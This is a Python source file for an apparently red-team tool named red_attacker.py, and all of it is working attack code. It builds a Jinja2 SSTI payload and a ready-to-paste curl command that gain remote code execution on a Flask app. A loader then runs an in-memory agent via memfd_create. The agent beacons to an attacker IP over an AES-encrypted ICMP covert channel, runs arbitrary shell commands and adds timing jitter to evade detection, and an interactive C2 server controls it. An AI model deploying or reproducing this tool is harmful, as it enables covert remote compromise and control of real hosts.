#!/usr/bin/env python3
"""
red_attacker.py - Fileless ICMP C2 Server
MITRE ATT&CK: T1059.006, T1027, T1095, T1620

SSTI exploit -> memfd_create payload -> AES-256-CTR encrypted ICMP C2.
Generates a curl/SSTI command for injection into the target Flask app,
then provides an interactive C2 shell over ICMP echo requests.

Key components:
  - Embedded agent code (runs in-memory on target via memfd_create)
  - AES-256-CTR encryption using system OpenSSL via ctypes
  - ICMP covert channel with custom protocol (MAGIC + MSG_TYPE + IV + ciphertext)

Usage:
  sudo python3 red_attacker.py -t TARGET_IP -l ATTACKER_IP
  sudo python3 red_attacker.py -t TARGET_IP -l ATTACKER_IP --payload-only
"""
import socket
import struct
import sys
import os
import threading
import time
import base64
import argparse
import select
import urllib.parse
import hashlib
import ctypes
import ctypes.util
import subprocess
import platform

# ═══════════════════════════════════════════════════════════════
#  Protocol Constants
# ═══════════════════════════════════════════════════════════════
ICMP_ID       = 0x1337       # 16-bit identifier in ICMP header — our "magic"
MAGIC         = 0xDE         # first byte of payload — quick filter
SHARED_SECRET = b"r3dt34m!@#2024xK"   # shared secret for key derivation

MSG_HEARTBEAT = 0x01         # agent → C2: "I'm alive"
MSG_COMMAND   = 0x02         # C2 → agent: "run this shell command"
MSG_RESULT    = 0x03         # agent → C2: chunked command output

# ═══════════════════════════════════════════════════════════════
#  Embedded Agent
#
#  This Python script runs ENTIRELY IN MEMORY on the target.
#  It is never written to disk — delivered via memfd_create.
#  Only uses Python stdlib (no pip dependencies on target).
#
#  Lifecycle:
#    1. Loader creates memfd, writes this code, fork+execve
#    2. Agent opens raw ICMP socket to C2
#    3. Sends periodic heartbeats (hostname, uid, kernel)
#    4. Receives commands, executes, returns chunked results
#    5. On '__exit__' command, closes socket and terminates
# ═══════════════════════════════════════════════════════════════
AGENT_CODE = r'''#!/usr/bin/env python3
"""ICMP C2 Agent — fileless, memory-resident, AES-256-CTR encrypted"""
import socket, struct, os, subprocess, time, random, sys, platform
import ctypes, ctypes.util, hashlib

C2 = "__C2_IP__"
SS = b"r3dt34m!@#2024xK"
ID = 0x1337
MG = 0xDE
HB_INTERVAL = 30

# ── AES-256-CTR via OpenSSL libcrypto ────────────────────────
# Uses ctypes to call the system's OpenSSL library directly.
# No pip packages needed — only stdlib + system libcrypto.
_lc = ctypes.CDLL(ctypes.util.find_library('crypto') or 'libcrypto.so')
_lc.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
_lc.EVP_CIPHER_CTX_new.argtypes = []
_lc.EVP_aes_256_ctr.restype = ctypes.c_void_p
_lc.EVP_aes_256_ctr.argtypes = []
_lc.EVP_EncryptInit_ex.restype = ctypes.c_int
_lc.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_char_p,ctypes.c_char_p]
_lc.EVP_EncryptUpdate.restype = ctypes.c_int
_lc.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p,ctypes.c_char_p,ctypes.POINTER(ctypes.c_int),ctypes.c_char_p,ctypes.c_int]
_lc.EVP_CIPHER_CTX_free.restype = None
_lc.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
AK = hashlib.sha256(SS).digest()

def _ac(d, iv):
    ctx = _lc.EVP_CIPHER_CTX_new()
    _lc.EVP_EncryptInit_ex(ctx, _lc.EVP_aes_256_ctr(), None, AK, iv)
    o = ctypes.create_string_buffer(len(d)+32)
    n = ctypes.c_int(0)
    _lc.EVP_EncryptUpdate(ctx, o, ctypes.byref(n), d, len(d))
    r = o.raw[:n.value]
    _lc.EVP_CIPHER_CTX_free(ctx)
    return r

def enc(d):
    iv = os.urandom(16)
    return iv + _ac(d, iv)

def dec(d):
    if len(d) < 16: return b''
    return _ac(d[16:], d[:16])

# ── ICMP checksum (RFC 1071) ────────────────────────────────
def ck(p):
    if len(p) % 2:
        p += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(p) // 2), p))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

# ── Transmit: ICMP echo request with AES-encrypted payload ──
# Payload: [MAGIC][msg_type][IV(16)][AES-CTR ciphertext]
def tx(sk, mt, pl, sq):
    bd = bytes([MG, mt]) + enc(pl)
    h = struct.pack('!BBHHH', 8, 0, 0, ID, sq)
    r = h + bd
    cs = ck(r)
    sk.sendto(struct.pack('!BBHHH', 8, 0, cs, ID, sq) + bd, (C2, 0))

# ── Receive: filter for our ICMP echo requests ──────────────
def rx(sk, to=5):
    sk.settimeout(to)
    end = time.time() + to
    while time.time() < end:
        try:
            d, a = sk.recvfrom(65535)
            if len(d) < 30:
                continue
            ic = d[20:]
            t, _, _, pi, sq = struct.unpack('!BBHHH', ic[:8])
            if pi != ID or t != 8:
                continue
            pl = ic[8:]
            if len(pl) < 18 or pl[0] != MG:
                continue
            return pl[1], sq, dec(pl[2:])
        except socket.timeout:
            break
        except Exception:
            continue
    return None, None, None

def main():
    # SOCK_RAW + IPPROTO_ICMP: kernel delivers raw ICMP packets
    # including the IP header.  Requires root or CAP_NET_RAW.
    sk = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sq = 0
    info = f"{socket.gethostname()}|{os.getuid()}|{os.uname().release}".encode()

    # Initial heartbeat — tells C2 we're alive
    tx(sk, 0x01, info, sq)
    sq += 1
    last_hb = time.time()

    while True:
        # Periodic heartbeat every HB_INTERVAL seconds
        # Random jitter in the main loop (1.0–2.5s) adds timing noise
        # to evade pattern-based detection of periodic beacons.
        now = time.time()
        if now - last_hb > HB_INTERVAL:
            tx(sk, 0x01, info, sq)
            sq += 1
            last_hb = now

        mt, rs, data = rx(sk, 3)
        if mt == 0x02:          # Command from C2
            cmd = data.rstrip(b'\x00').decode(errors='replace')
            if cmd == '__exit__':
                break
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
                out = (r.stdout or b'') + (r.stderr or b'')
                if not out:
                    out = b'[no output]'
            except Exception as e:
                out = f'[err: {e}]'.encode()

            # Chunk output into 480-byte pieces (ICMP payload size limit
            # is ~65507 bytes, but smaller chunks avoid fragmentation and
            # look more like normal ping traffic).
            # Header: [chunk_index:u16][total_chunks:u16] for reassembly.
            for i in range(0, len(out), 480):
                chunk = out[i:i + 480]
                hdr = struct.pack('!HH', i // 480, (len(out) + 479) // 480)
                tx(sk, 0x03, hdr + chunk, sq)
                sq += 1
                time.sleep(0.05)    # 50ms inter-chunk delay

        # Random sleep: 1.0–2.5s — introduces timing jitter to
        # make traffic pattern analysis harder for blue team.
        time.sleep(random.uniform(1.0, 2.5))

    sk.close()

if __name__ == '__main__':
    main()
'''

# ═══════════════════════════════════════════════════════════════
#  Crypto & ICMP Helpers
# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
#  AES-256-CTR Crypto via ctypes + OpenSSL
#
#  Uses the system's libcrypto (OpenSSL) for AES-256-CTR encryption.
#  No pip dependencies required — ctypes calls the shared library directly.
#
#  Key derivation: AES_KEY = SHA-256(SHARED_SECRET) → 32 bytes
#  Per-packet random IV prevents identical plaintext → identical ciphertext.
#  CTR mode: encrypt and decrypt are the same operation.
# ═══════════════════════════════════════════════════════════════

_libcrypto = ctypes.CDLL(ctypes.util.find_library('crypto') or 'libcrypto.so')
_libcrypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
_libcrypto.EVP_CIPHER_CTX_new.argtypes = []
_libcrypto.EVP_aes_256_ctr.restype = ctypes.c_void_p
_libcrypto.EVP_aes_256_ctr.argtypes = []
_libcrypto.EVP_EncryptInit_ex.restype = ctypes.c_int
_libcrypto.EVP_EncryptInit_ex.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    ctypes.c_char_p, ctypes.c_char_p]
_libcrypto.EVP_EncryptUpdate.restype = ctypes.c_int
_libcrypto.EVP_EncryptUpdate.argtypes = [
    ctypes.c_void_p, ctypes.c_char_p,
    ctypes.POINTER(ctypes.c_int), ctypes.c_char_p, ctypes.c_int]
_libcrypto.EVP_EncryptFinal_ex.restype = ctypes.c_int
_libcrypto.EVP_EncryptFinal_ex.argtypes = [
    ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int)]
_libcrypto.EVP_CIPHER_CTX_free.restype = None
_libcrypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]

AES_KEY = hashlib.sha256(SHARED_SECRET).digest()  # 32 bytes for AES-256


def aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-256-CTR encrypt/decrypt via OpenSSL libcrypto.
    CTR mode is symmetric — same function encrypts and decrypts.
    Follows OpenSSL best practice: Init → Update → Final."""
    ctx = _libcrypto.EVP_CIPHER_CTX_new()
    _libcrypto.EVP_EncryptInit_ex(
        ctx, _libcrypto.EVP_aes_256_ctr(), None, key, iv)
    out = ctypes.create_string_buffer(len(data) + 32)
    out_len = ctypes.c_int(0)
    _libcrypto.EVP_EncryptUpdate(
        ctx, out, ctypes.byref(out_len), data, len(data))
    # Final step (CTR mode outputs 0 bytes here, but required by OpenSSL API)
    final_len = ctypes.c_int(0)
    _libcrypto.EVP_EncryptFinal_ex(
        ctx, ctypes.cast(ctypes.byref(out, out_len.value), ctypes.c_char_p),
        ctypes.byref(final_len))
    result = out.raw[:out_len.value + final_len.value]
    _libcrypto.EVP_CIPHER_CTX_free(ctx)
    return result


def aes_encrypt(plaintext: bytes) -> bytes:
    """Encrypt with random IV. Returns: IV (16 bytes) + ciphertext."""
    iv = os.urandom(16)
    return iv + aes_ctr(plaintext, AES_KEY, iv)


def aes_decrypt(data: bytes) -> bytes:
    """Decrypt: first 16 bytes = IV, rest = ciphertext."""
    if len(data) < 16:
        return b''
    return aes_ctr(data[16:], AES_KEY, data[:16])


def icmp_checksum(packet: bytes) -> int:
    """RFC 1071 Internet Checksum.

    Algorithm:
      1. Treat the data as a sequence of 16-bit big-endian integers
      2. Sum all integers using ones' complement addition (carry wraps)
      3. Take the ones' complement (bitwise NOT) of the final sum
    The result is placed in the checksum field of the ICMP header.
    The receiver performs the same calculation over the entire packet
    (including the checksum); if the result is 0xFFFF, the packet is valid.
    """
    if len(packet) % 2:
        packet += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(packet) // 2), packet))
    s = (s >> 16) + (s & 0xffff)   # fold 32-bit carry into 16 bits
    s += s >> 16                     # fold again (at most one more carry)
    return (~s) & 0xffff


def build_icmp_packet(msg_type: int, payload: bytes, seq: int) -> bytes:
    """Construct a complete ICMP echo request packet.

    Layout (RFC 792):
      Byte 0   : Type = 8 (echo request)
      Byte 1   : Code = 0
      Bytes 2-3: Checksum (computed over entire ICMP message)
      Bytes 4-5: Identifier (ICMP_ID = 0x1337, our C2 marker)
      Bytes 6-7: Sequence number
      Bytes 8+ : Data payload = [MAGIC][msg_type][IV(16B)][AES-CTR data]

    The checksum must be computed with the checksum field set to zero,
    then patched back into the header.  This is the standard ICMP procedure.
    """
    body = bytes([MAGIC, msg_type]) + aes_encrypt(payload)
    header = struct.pack('!BBHHH', 8, 0, 0, ICMP_ID, seq)
    raw = header + body
    cs = icmp_checksum(raw)
    return struct.pack('!BBHHH', 8, 0, cs, ICMP_ID, seq) + body


def send_command(sock, target_ip: str, cmd: str, seq: int) -> int:
    """Send a MSG_COMMAND ICMP packet to the agent."""
    pkt = build_icmp_packet(MSG_COMMAND, cmd.encode('utf-8'), seq)
    sock.sendto(pkt, (target_ip, 0))
    return seq + 1


# ═══════════════════════════════════════════════════════════════
#  SSTI Payload Generator
#
#  Builds a multi-layer payload that achieves fileless RCE via
#  a single HTTP POST request.
#
#  Delivery chain (4 stages):
#
#    Stage 1 — SSTI Injection
#      The Jinja2 expression {{ config.__class__.__init__
#      .__globals__['os'].popen('...').read() }} traverses
#      Python's object model to reach os.popen(), which spawns
#      a shell subprocess.
#
#    Stage 2 — Base64 Shell Pipeline
#      The shell command is: echo <B64>|base64 -d|python3
#      This decodes the loader script and pipes it to python3.
#      Double base64 encoding avoids ALL escaping issues
#      (no quotes, no special chars in the SSTI string).
#
#    Stage 3 — Loader (runs as python3 subprocess)
#      The loader:
#        a. Decodes the agent from base64
#        b. Calls memfd_create (syscall 319) → anonymous fd
#        c. Writes agent code into the fd
#        d. Calls fork() — parent exits (Flask popen returns)
#        e. Child calls execve("/usr/bin/python3",
#             ["/proc/<pid>/fd/<N>"]) — runs agent from memory
#
#    Stage 4 — Agent (runs as orphan process, entirely in RAM)
#      The agent opens a raw ICMP socket and begins beaconing
#      to the C2 server.  It never touches the filesystem.
#
# ═══════════════════════════════════════════════════════════════

def _get_memfd_syscall_nr() -> int:
    """Auto-detect memfd_create syscall number by architecture."""
    machine = platform.machine()
    syscall_map = {
        'x86_64':  319,
        'aarch64': 279,
        'armv7l':  385,
        'i686':    356,
        'i386':    356,
    }
    nr = syscall_map.get(machine)
    if nr is None:
        print(f"[!] 未知架構 {machine}，預設使用 x86_64 memfd_create syscall #319")
        nr = 319
    return nr

def _find_python3_path() -> str:
    """Find python3 binary path for use in loader execve."""
    for p in ['/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3']:
        if os.path.isfile(p):
            return p
    # fallback: use sys.executable (works on most systems)
    return '/usr/bin/env python3'


def generate_ssti_payload(attacker_ip: str) -> str:
    """Build the complete SSTI payload string."""
    # Inject C2 IP into agent source code
    agent_src = AGENT_CODE.replace('__C2_IP__', attacker_ip)
    agent_b64 = base64.b64encode(agent_src.encode()).decode()

    # Auto-detect memfd_create syscall number
    memfd_nr = _get_memfd_syscall_nr()

    # Loader script — the "dropper" that runs in the popen subprocess.
    #
    # ctypes.CDLL(None).syscall(memfd_nr, b"", 0):
    #   - CDLL(None) loads libc (the C standard library)
    #   - .syscall(memfd_nr, ...) invokes memfd_create via raw syscall
    #   - syscall number is architecture-dependent (auto-detected)
    #   - b"" is the name (empty string, shows as "memfd:" in /proc)
    #   - 0 is flags (no MFD_CLOEXEC, so fd survives execve)
    #
    # os.fork():
    #   - Returns 0 in child, child PID in parent
    #   - Parent exits immediately (so popen finishes and Flask responds)
    #   - Child is re-parented to init (PID 1) — becomes a daemon
    #
    # python3_path auto-detected:
    #   - Checks /usr/bin/python3, /usr/local/bin/python3, etc.
    #   - Ensures execve works on different Ubuntu installations
    loader = (
        'import ctypes,os,base64,platform\n'
        f'c=base64.b64decode("{agent_b64}")\n'
        # Auto-detect syscall number on target side too
        '_m={"x86_64":319,"aarch64":279,"armv7l":385,"i686":356}\n'
        '_nr=_m.get(platform.machine(),319)\n'
        'fd=ctypes.CDLL(None).syscall(_nr,b"",0)\n'
        'os.write(fd,c)\n'
        # Auto-detect python3 path on target
        'import shutil\n'
        '_py=shutil.which("python3") or "/usr/bin/python3"\n'
        'p=os.fork()\n'
        'if p==0:\n'
        '    os.execve(_py,'
        '["python3","/proc/"+str(os.getpid())+"/fd/"+str(fd)],'
        'dict(os.environ))\n'
    )
    loader_b64 = base64.b64encode(loader.encode()).decode()

    # Final SSTI expression:
    #   config.__class__  → <class 'flask.config.Config'>
    #   .__init__         → Config.__init__ method
    #   .__globals__      → module-level globals of flask/config.py
    #   ['os']            → os module (flask.config imports os)
    #   .popen('...')     → subprocess.Popen wrapper → spawns shell
    #   .read()           → reads stdout (empty, since loader forks)
    ssti = (
        "{{config.__class__.__init__.__globals__['os']"
        ".popen('echo "
        + loader_b64
        + "|base64 -d|python3').read()}}"
    )
    return ssti


def generate_curl_command(target_ip: str, target_port: int,
                          attacker_ip: str) -> str:
    """Return a ready-to-paste curl command with URL-encoded SSTI payload."""
    raw_ssti = generate_ssti_payload(attacker_ip)
    # URL-encode ALL special characters so the SSTI payload survives
    # HTTP form encoding.  Flask's request.form parser will decode it
    # back to the original Jinja2 expression.
    encoded = urllib.parse.quote(raw_ssti, safe='')
    return (
        f'curl -s -X POST http://{target_ip}:{target_port}/diag '
        f'-d "query={encoded}"'
    )


# ═══════════════════════════════════════════════════════════════
#  C2 Server
#
#  Architecture:
#    - Main thread: interactive command prompt (blocking input)
#    - Listener thread: background ICMP packet capture
#    - Communication: threading.Event for result synchronization
#
#  The listener captures ALL incoming ICMP packets on the raw
#  socket, filters for our protocol (ID + MAGIC), decrypts the
#  AES-decrypted payload, and dispatches based on message type.
#
#  Packet flow:
#    Agent → [ICMP type 8, ID 0x1337] → C2 raw socket
#    C2    → [ICMP type 8, ID 0x1337] → Agent raw socket
#    (kernel auto-replies with type 0 are ignored by both sides)
# ═══════════════════════════════════════════════════════════════

class C2Server:
    def __init__(self, target_ip: str, listen_ip: str = '0.0.0.0'):
        self.target_ip = target_ip
        self.listen_ip = listen_ip
        # Raw ICMP socket — receives ALL ICMP packets destined for this host
        self.sock = socket.socket(
            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        self.seq = 0
        self.running = True
        self.agent_info = None
        self.result_chunks: dict[int, bytes] = {}
        self.result_total = 0
        self.result_ready = threading.Event()

    def _listener(self):
        """Background thread: capture and parse incoming ICMP packets."""
        while self.running:
            try:
                # select() with 1s timeout — non-blocking check
                ready, _, _ = select.select([self.sock], [], [], 1.0)
                if not ready:
                    continue
                data, addr = self.sock.recvfrom(65535)
                if len(data) < 30:
                    continue

                # Parse raw packet: [IP header 20B][ICMP header 8B][payload]
                icmp_data = data[20:]
                icmp_type, _, _, pkt_id, seq = struct.unpack(
                    '!BBHHH', icmp_data[:8])

                # Filter: our ID + echo request only (ignore auto-replies)
                if pkt_id != ICMP_ID or icmp_type != 8:
                    continue

                payload = icmp_data[8:]
                if len(payload) < 18 or payload[0] != MAGIC:
                    continue    # 1 magic + 1 type + 16 IV minimum

                msg_type = payload[1]
                dec = aes_decrypt(payload[2:])

                if msg_type == MSG_HEARTBEAT:
                    self.agent_info = dec.decode('utf-8', errors='replace')
                    parts = self.agent_info.split('|')
                    print(f"\n\033[92m[+] Agent beacon  {addr[0]}\033[0m")
                    if len(parts) >= 3:
                        print(f"    Host={parts[0]}  UID={parts[1]}  "
                              f"Kernel={parts[2]}")
                    print("\033[93mC2>\033[0m ", end='', flush=True)

                elif msg_type == MSG_RESULT:
                    # Chunked result reassembly:
                    # First 4 bytes = [chunk_index:u16][total_chunks:u16]
                    if len(dec) >= 4:
                        idx, total = struct.unpack('!HH', dec[:4])
                        self.result_chunks[idx] = dec[4:]
                        self.result_total = total
                        if len(self.result_chunks) >= total:
                            self.result_ready.set()

            except Exception:
                continue

    def send_cmd(self, cmd: str):
        self.result_chunks.clear()
        self.result_total = 0
        self.result_ready.clear()
        self.seq = send_command(self.sock, self.target_ip, cmd, self.seq)

    def wait_result(self, timeout: float = 20.0) -> str:
        if self.result_ready.wait(timeout=timeout):
            out = b''
            for i in sorted(self.result_chunks.keys()):
                out += self.result_chunks[i]
            self.result_chunks.clear()
            return out.decode('utf-8', errors='replace')
        return '\033[90m[timeout — no response from agent]\033[0m'

    def interactive(self):
        t = threading.Thread(target=self._listener, daemon=True)
        t.start()

        print("\033[91m")
        print("+" + "=" * 52 + "+")
        print("|     Red Team  Fileless ICMP C2  v2.0             |")
        print("|     AES-256-CTR Encrypted Covert Channel          |")
        print("|     memfd_create Payload Delivery                |")
        print("+" + "=" * 52 + "+")
        print("\033[0m")
        print(f"  Target : {self.target_ip}")
        print(f"  C2 IP  : {self.listen_ip}")
        print(f"  Proto  : ICMP echo-request | ID 0x{ICMP_ID:04X}")
        print(f"  Crypto : AES-256-CTR + random IV (OpenSSL)")
        print()
        print("  Commands:")
        print("    <cmd>      Execute shell command on target")
        print("    payload    Print SSTI curl attack command")
        print("    status     Show agent info")
        print("    exit       Kill agent & quit")
        print("    quit       Quit C2 (agent stays alive)")
        print()
        print("[*] Waiting for agent beacon...\n")

        while self.running:
            try:
                cmd = input("\033[93mC2>\033[0m ").strip()
                if not cmd:
                    continue

                if cmd == 'quit':
                    self.running = False
                    break
                if cmd == 'status':
                    if self.agent_info:
                        print(f"  Agent: {self.agent_info}")
                    else:
                        print("  \033[90mNo agent connected yet\033[0m")
                    continue
                if cmd == 'payload':
                    print(f"\n\033[96m{generate_curl_command(self.target_ip, 9999, self.listen_ip)}\033[0m\n")
                    continue
                if cmd == 'exit':
                    self.send_cmd('__exit__')
                    print("[*] Exit signal sent")
                    self.running = False
                    break

                self.send_cmd(cmd)
                result = self.wait_result()
                print(result)

            except (KeyboardInterrupt, EOFError):
                print("\n[*] Shutting down C2...")
                self.running = False
                break

        self.sock.close()


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════

def _icmp_precheck(target_ip: str) -> bool:
    """Quick ICMP reachability test before starting C2."""
    try:
        result = subprocess.run(
            ['ping', '-c', '2', '-W', '2', target_ip],
            capture_output=True, timeout=10)
        return result.returncode == 0
    except Exception:
        return False


def main():
    p = argparse.ArgumentParser(description='Red Team Fileless ICMP C2')
    p.add_argument('--target', '-t', required=True, help='Target IP')
    p.add_argument('--lhost', '-l', required=True,
                   help='Attacker IP (agent calls back here)')
    p.add_argument('--port', '-p', type=int, default=9999,
                   help='Target app port (default 9999)')
    p.add_argument('--payload-only', action='store_true',
                   help='Only print the SSTI curl command, then exit')
    p.add_argument('--skip-check', action='store_true',
                   help='Skip ICMP connectivity pre-check')
    args = p.parse_args()

    if args.payload_only:
        print(generate_curl_command(args.target, args.port, args.lhost))
        return

    if os.geteuid() != 0:
        print("[!] Raw ICMP socket requires root.  Run with: sudo")
        sys.exit(1)

    # ── ICMP 連通性預檢 ──
    if not args.skip_check:
        print("\n[*] ICMP 連通性預檢...")
        if _icmp_precheck(args.target):
            print(f"  ✅ {args.target} ICMP 可達")
        else:
            print(f"  ❌ {args.target} ICMP 不可達!")
            print(f"  → C2 使用 ICMP 傳輸指令，目標必須可 ping 通")
            print(f"  → 檢查: UFW / iptables / 雲端安全組是否封鎖 ICMP")
            print(f"  → 詳細檢查: sudo bash red_team/check_connectivity.sh {args.target} {args.lhost}")
            print(f"  → 強制跳過: 加上 --skip-check 參數")
            sys.exit(1)

    # ── 架構資訊 ──
    memfd_nr = _get_memfd_syscall_nr()
    print(f"  ℹ️  memfd_create syscall #{memfd_nr} ({platform.machine()})")

    print("\n\033[93m[*] SSTI attack command (paste into another terminal):\033[0m\n")
    print(f"  {generate_curl_command(args.target, args.port, args.lhost)}\n")

    server = C2Server(target_ip=args.target, listen_ip=args.lhost)
    server.interactive()


if __name__ == '__main__':
    main()
